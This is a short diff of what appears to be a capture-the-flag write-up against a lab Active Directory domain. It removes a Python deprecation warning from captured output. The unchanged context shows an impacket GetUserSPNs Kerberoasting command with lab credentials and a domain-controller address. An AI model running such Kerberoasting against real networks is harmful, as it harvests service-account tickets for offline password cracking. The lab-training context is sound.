@@ -288,8 +288,6 @@ Time to kerberoast then:
 ```python
 GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.201.102.90 -request
 
-/home/kali/env/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
-  import pkg_resources
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
